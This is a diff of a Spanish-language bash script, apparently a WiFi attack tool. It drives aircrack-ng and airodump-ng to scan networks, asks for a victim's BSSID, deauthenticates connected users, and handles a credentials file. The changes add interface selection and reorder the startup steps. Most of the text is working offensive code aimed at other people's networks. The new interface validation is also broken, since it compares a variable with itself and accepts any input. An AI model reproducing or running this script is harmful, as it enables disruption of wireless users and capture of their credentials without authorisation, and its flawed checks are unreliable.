@@ -12,15 +12,35 @@ purpleColour="\e[0;35m\033[1m"
 turquoiseColour="\e[0;36m\033[1m"
 grayColour="\e[0;37m\033[1m"
 #------------------------------------------------------
-
-#variables globales
-#-------------------------------------------------------
-interface="$(sudo wpa_cli interface | tail -n 1 | sed 's/ //g')"
-#-----------------------------------------------------
-
-
 #Zona de funciones
-#----------------------------------------------------------------
+#-------------------------------------------------------
+interfaz () {
+	sleep 1
+	clear
+	clear; if [[ -e credenciales.txt ]]; then
+		rm -rf credenciales.txt
+	fi
+
+	echo -e "\n${yellowColour}[*]${endColour} ${purpleColour}Listando interfaces de red disponibles...${endColour}"; sleep 1
+
+	# Si la interfaz posee otro nombre, cambiarlo en este punto (consideramos que se llama wlan0 por defecto)
+	airmon-ng start wlan0 > /dev/null 2>&1; interface=$(ifconfig -a | cut -d ' ' -f 1 | xargs | tr ' ' '\n' | tr -d ':' > iface)
+	counter=1; for interface in $(cat iface); do
+		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
+		let counter++
+	done; tput cnorm
+	checker=0; while [ $checker -ne 1 ]; do
+		echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Nombre de la interfaz (Ej: wlan0mon): ${endColour}" && read interface
+
+		for interface in $(cat iface); do
+			if [ "$interface" == "$interface" ]; then
+				checker=1
+			fi
+		done; if [ $checker -eq 0 ]; then echo -e "\n${redColour}[!]${endColour}${yellowColour} La interfaz proporcionada no existe${endColour}"; fi
+	done
+modo_monitor
+
+}
 trap ctrl_c INT
 function ctrl_c(){
 	printf "\n\n${yellowColour}[*]${endColour}${grayColour} Escapando....\n${endColour}"
@@ -54,7 +74,7 @@ sleep 1
 printf "${yellowColour}[>:)]${endColour}${greenColour} Desautenticando usuarios ${endColour}\n"
 sleep 1
 var=2
-while [ $(echo "hola") ]; do
+while true; do
 lineas=$var
 resultado="$(cat captura-01.csv | tail -n $lineas | cut -b 3 | head -n 1)"
 	if [ "$resultado" = ":" ]; then
@@ -78,9 +98,9 @@ inicio_ataque ()
 {
 sleep 1
 printf "${yellowColour}[#]${endColour}${purpleColour} Escaneando redes.... ${endColour}\n"
-sleep 1
-sudo airodump-ng $interface &
 sleep 2
+sudo airodump-ng $interface &
+sleep 3
 sudo killall airodump-ng
 printf "${yellowColour}[@]${endColour}${grayColour} Ingrese el ${purpleColiour}BSSID de su${endColour}${endColour}${redColour} victima: ${endColour}"
 read victima
@@ -92,12 +112,15 @@ olfateo $victima $canal
 dependencias ()
 {
 if [ $(command -v aircrack-ng) ]; then
+sleep 1
 printf "${greenColour}[*]${endColour}${grayColour} Usted posee todos los paquetes necesarios${endColour}\n"
-modo_monitor
+sleep 2
+interfaz
 else
 printf "${redColour}[!]${endColour}${grayColour} Usted no posee los paquetes necesarios${endColour}\n"
 sleep 1
 printf "${redColour}[!]${endColour}${grayColour} Paquetes necesarios para funcionar: ${endColour}\n"	
+sleep 1
 printf "${purpleColour}- net-tools${endColour}\n"
 printf "${purpleColour}- aircrack-ng${endColour}\n"
 sleep 2
@@ -132,6 +155,7 @@ printf "${redColour}[!]${endColour}${grayColour} Porfavor ocupar responsablement
 sleep 1
 printf "${blueColour}[*]${endColour}${grayColour} Revisando paquetes necesarios.......${endColour}\n"
 sleep 1
+dependencias
 }
 #----------------------------------------------------
 #Fin zona de funciones
@@ -139,7 +163,6 @@ sleep 1
 #Main
 #---------------------
 inicio
-dependencias
 #---------------------
 #  No leas mi codigo !! >:V
 #  Na leelo tranqui xd
